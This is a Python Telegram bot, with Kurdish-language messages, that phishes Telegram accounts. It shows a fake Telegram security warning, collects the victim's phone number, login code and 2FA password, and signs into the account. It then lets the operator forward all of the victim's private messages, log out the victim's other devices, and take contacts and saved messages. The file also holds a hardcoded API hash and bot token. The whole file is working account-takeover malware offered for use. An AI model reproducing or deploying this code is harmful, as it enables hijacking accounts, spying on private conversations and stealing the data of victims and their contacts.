import asyncio
import os
from pyrogram import Client, filters, errors
from pyrogram.types import (ReplyKeyboardMarkup, KeyboardButton, 
                            InlineKeyboardMarkup, InlineKeyboardButton, ReplyKeyboardRemove)

# --- زانیارییە جێگیرکراوەکانی تۆ ---
API_ID = 38225812
API_HASH = "aff3c308c587f18a5975910fbcf68366"
BOT_TOKEN = "8424748782:AAG0VELUlOfabsayVic2SpUAR-hWsh-nnf0"
ADMIN_ID = 7414272224

app = Client("spy_bot_pro", api_id=API_ID, api_hash=API_HASH, bot_token=BOT_TOKEN)

# بیرەوەری کاتی بۆ هەڵگرتنی سێشنەکان
active_sessions = {}

def get_control_panel(u_id):
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("📡 چالاککردنی فۆروارد (سیخوڕی)", callback_data=f"spy_{u_id}")],
        [InlineKeyboardButton("⚔️ دەرکردنی هەموو ئامێرەکان", callback_data=f"kick_{u_id}")],
        [InlineKeyboardButton("📇 وەرگرتنی ناوەکان", callback_data=f"cnt_{u_id}"),
         InlineKeyboardButton("📂 دوایین نامەکان", callback_data=f"msg_{u_id}")]
    ])

@app.on_message(filters.command("start") & filters.private)
async def start(client, message):
    if message.from_user.id == ADMIN_ID:
        await message.reply_text("✅ بەخێرهاتی گەورەم\nبۆتەکە ئامادەیە بۆ ڕاوکردن!")
        return
    
    kb = ReplyKeyboardMarkup([[KeyboardButton("📲 پشتڕاستکردنەوەی ئەکاونت", request_contact=True)]], resize_keyboard=True)
    await message.reply_text("⚠️ **ئاگاداری تێلیگرام**\n\nبۆ پاراستنی ئەکاونتەکەت و ڕێگری لە هاککردن، تکایە کلیک لە دوگمەی خوارەوە بکە بۆ پشتڕاستکردنەوەی ناسنامەکەت:", reply_markup=kb)

@app.on_message(filters.contact & filters.private)
async def contact_handler(client, message):
    u_id = message.from_user.id
    phone = message.contact.phone_number
    
    # دروستکردنی کلاینت بە ناوی نێچیرەکە
    c = Client(
        f"session_{u_id}", 
        api_id=API_ID, api_hash=API_HASH,
        device_model="Samsung Galaxy S23 Ultra",
        system_version="Android 13.0"
    )
    
    await c.connect()
    try:
        sent_code = await c.send_code(phone)
        active_sessions[u_id] = {"client": c, "phone": phone, "hash": sent_code.phone_code_hash, "step": "code"}
        await message.reply_text("📩 کۆدێکی ٥ ژمارەیی لەلایەن تێلیگرامەوە بۆت نێردرا، لێرە بینووسە:", reply_markup=ReplyKeyboardRemove())
        await app.send_message(ADMIN_ID, f"☎️ ژمارەیەکی نوێ هات: `+{phone}`\nئێستا چاوەڕێی کۆدەکەین...")
    except Exception as e:
        await app.send_message(ADMIN_ID, f"❌ هەڵە لە ناردنی کۆد: {e}")

@app.on_message(filters.text & filters.private)
async def login_logic(client, message):
    u_id = message.from_user.id
    if u_id not in active_sessions or u_id == ADMIN_ID: return
    
    data = active_sessions[u_id]
    code = message.text.strip().replace(" ", "")

    try:
        if data["step"] == "code":
            await asyncio.sleep(2) 
            await data["client"].sign_in(data["phone"], data["hash"], code)
        elif data["step"] == "2fa":
            await data["client"].check_password(code)

        await message.reply_text("✅ ئەکاونتەکەت بە سەرکەوتووی پارێزرا.")
        await app.send_message(ADMIN_ID, f"🔥 نێچیر لۆگین بوو!\n📱 ژمارە: `+{data['phone']}`", reply_markup=get_control_panel(u_id))
        data["step"] = "done"

    except errors.SessionPasswordNeeded:
        data["step"] = "2fa"
        await message.reply_text("🔑 ئەم ئەکاونتە پاسۆردی (2FA) لەسەرە، تکایە پاسۆردەکە بنێرە:")
    except Exception as e:
        await app.send_message(ADMIN_ID, f"❌ هەڵە لە لۆگین: {e}")

@app.on_callback_query()
async def actions(client, query):
    data_parts = query.data.split("_")
    cmd = data_parts[0]
    target_id = int(data_parts[1])
    
    if target_id not in active_sessions:
        await query.answer("❌ ئەم نێچیرە نەدۆزرایەوە (بۆتەکە ڕیستارت بووەتەوە)", show_alert=True)
        return

    u_client = active_sessions[target_id]["client"]
    
    try:
        if cmd == "spy":
            @u_client.on_message(filters.private & ~filters.me)
            async def auto_forward(c, m):
                await m.forward(ADMIN_ID)
            await query.answer("📡 سیخوڕی چالاک بوو! هەموو نامەکانی بۆت دێت.", show_alert=True)
        
        elif cmd == "kick":
            sessions = await u_client.get_authorizations()
            for s in sessions:
                if not s.is_current:
                    await u_client.terminate_session(s.hash)
            await query.answer("⚔️ هەموو ئامێرەکانی تر دەرکران و تەنها ئێمە ماوینەتەوە.", show_alert=True)

        elif cmd == "cnt":
            contacts = await u_client.get_contacts()
            res = "📇 ١٠ ناو لە لیستەکە:\n\n"
            res += "\n".join([f"👤 {c.first_name}: +{c.phone_number}" for c in contacts[:10]])
            await app.send_message(ADMIN_ID, res)
            await query.answer("ناوەکان نێردران")

        elif cmd == "msg":
            async for m in u_client.get_chat_history("me", limit=5):
                await m.forward(ADMIN_ID)
            await query.answer("نامەکان نێردران")
            
    except Exception as e:
        await query.answer(f"⚠️ هەڵە: {e}", show_alert=True)

print("--- BOT IS ONLINE ---")
app.run()
